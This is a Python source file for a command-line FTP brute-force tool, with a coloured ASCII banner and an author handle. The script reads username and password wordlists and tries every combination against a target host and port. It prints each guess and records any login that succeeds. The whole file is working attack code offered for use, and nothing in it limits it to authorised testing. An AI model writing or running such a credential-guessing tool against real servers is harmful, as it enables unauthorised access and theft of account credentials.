import argparse
import ftplib
import random
import sys
from colorama import Fore
from termcolor import colored

rainbow = ['red', 'green', 'green', 'blue', 'magenta', 'cyan']
r0 = random.randint(0, 5)
r1 = random.randint(0, 5)
r2 = random.randint(0, 5)
r3 = random.randint(0, 5)
r4 = random.randint(0, 5)


print(colored("\t┌──────────────────────────┐", rainbow[r0]))
print(colored("\t│╔═╗╔╦╗╔═╗  ╔╗ ┬─┐┬ ┬┌┬┐┌─┐│", rainbow[r1]))
print(colored("\t│╠╣  ║ ╠═╝  ╠╩╗├┬┘│ │ │ ├┤ │", rainbow[r2]))
print(colored("\t│╚   ╩ ╩    ╚═╝┴└─└─┘ ┴ └─┘│", rainbow[r3]))
print(colored("\t└─────────0xb14cky─────────┘\n", rainbow[r4]))


parser = argparse.ArgumentParser(
    description="A Simple FTP Bruteforce Tool !!",
    formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=47)
)
parser.add_argument("-d", "--host", help="Domain Name You Want to Scan", type=str)
parser.add_argument("-p", "--port", help="Any Specific Port", type=int)
parser.add_argument("-uf", "--userFile", help="Username File", type=str)
parser.add_argument("-pf", "--passFile", help="Password File", type=str)
parser.add_argument("-o", "--output", help="Saving Output In Another File", type=str)
args = parser.parse_args()

user = ""
passwd = ""


def bruteForceLogin(Username, Hostname, Password, Port):
    file1 = []
    file2 = []
    with open(Username, 'r') as f:
        for line in f:
            file1.append(line.rstrip().strip('\n').strip('\r'))

    with open(Password, 'r') as f1:
        for line in f1:
            file2.append(line.rstrip().strip('\n').strip('\r'))

    for Username in file1:
        for passWord in file2:
            print(Fore.RED, "\n[+] Trying : " + str(Username) + ":" + str(passWord), Fore.RESET)
            try:
                ftp = ftplib.FTP()
                ftp.connect(Hostname, Port)
                ftp.login(Username, passWord)
                print(Fore.GREEN,
                      "\nFTP Login succeeded : \n" + "\nUsername :" + str(Username) + "\nPassword :" + str(passWord),
                      Fore.RESET)
                ftp.quit()
                global user, passwd
                user = Username
                passwd = passWord
                return Username, passWord
            except Exception:
                pass


Port = 21
if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

if args.host and args.userFile and args.passFile:
    bruteForceLogin(args.userFile, args.host, args.passFile, Port)
    pass
if args.port:
    bruteForceLogin(args.userFile,args.host, args.passFile, args.port)
    pass

if args.output:
    f = open(f'{args.output}', 'w')
    msg = "\nFTP Login succeeded : \n" + "\nUsername :" + str(user) + "\nPassword :" + str(passwd)
    f.write(msg)
    pass
